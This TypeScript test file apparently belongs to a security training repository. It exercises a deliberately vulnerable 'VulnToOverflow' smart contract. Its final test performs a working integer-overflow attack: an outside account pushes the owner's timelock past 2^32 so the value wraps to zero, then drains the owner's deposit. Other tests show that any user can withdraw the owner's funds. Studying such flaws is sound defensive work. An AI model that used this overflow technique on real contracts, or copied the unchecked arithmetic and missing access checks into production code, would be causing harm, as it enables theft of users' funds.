import { expect } from "chai";
import { ethers } from "hardhat";
import { time } from "@nomicfoundation/hardhat-network-helpers";

import { VulnToOverflow } from "../../typechain-types/contracts/Security";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

describe("VulnToOverflow", () => {
  let owner: SignerWithAddress,
    addr1: SignerWithAddress,
    addr2: SignerWithAddress,
    VulnToOverflowContract: VulnToOverflow;

  beforeEach(async () => {
    const VulnToOverflowFactory = await ethers.getContractFactory(
      "VulnToOverflow"
    );
    VulnToOverflowContract = await VulnToOverflowFactory.deploy();

    [owner, addr1, addr2] = await ethers.getSigners();

    await VulnToOverflowContract.deposit({
      value: ethers.utils.parseEther("10.0"),
    });
  });

  it("has initial balance of 10 eth", async function () {
    expect(await VulnToOverflowContract.balances(owner.address)).to.equal(
      ethers.utils.parseEther("10.0")
    );
  });

  it("reverts even for the owner while still within timelock", async function () {
    await expect(
      VulnToOverflowContract.withdraw(owner.address)
    ).to.be.revertedWith("TIMELOCK_ACTIVE");
  });

  it("reverts for external user while still within timelock", async function () {
    await expect(
      VulnToOverflowContract.connect(addr1).withdraw(owner.address)
    ).to.be.revertedWith("TIMELOCK_ACTIVE");
  });

  it("allows withdrawal for owner while still within timelock", async function () {
    await time.increase(60 * 60 * 24 * 7);

    await expect(VulnToOverflowContract.withdraw(owner.address)).not.to.be
      .reverted;

    expect(await VulnToOverflowContract.balances(owner.address)).to.equal(0);
  });

  it("allows withdrawal for external user while still within timelock", async function () {
    await time.increase(60 * 60 * 24 * 7);

    await expect(VulnToOverflowContract.connect(addr1).withdraw(owner.address))
      .not.to.be.reverted;

    expect(await VulnToOverflowContract.balances(owner.address)).to.equal(0);
  });

  it("allows overflow attack", async function () {
    const lockTime = await VulnToOverflowContract.lockTime(owner.address);

    const timeToOverflow = 2 ** 32 - Number(lockTime);

    await VulnToOverflowContract.connect(addr1).increaseLockTime(
      owner.address,
      timeToOverflow
    );

    const nextLockTime = await VulnToOverflowContract.lockTime(owner.address);

    expect(nextLockTime).to.equal(0);

    await expect(
      VulnToOverflowContract.connect(addr1).withdraw(owner.address)
    ).not.to.be.revertedWith("TIMELOCK_ACTIVE");

    expect(await VulnToOverflowContract.balances(owner.address)).to.equal(0);
  });
});
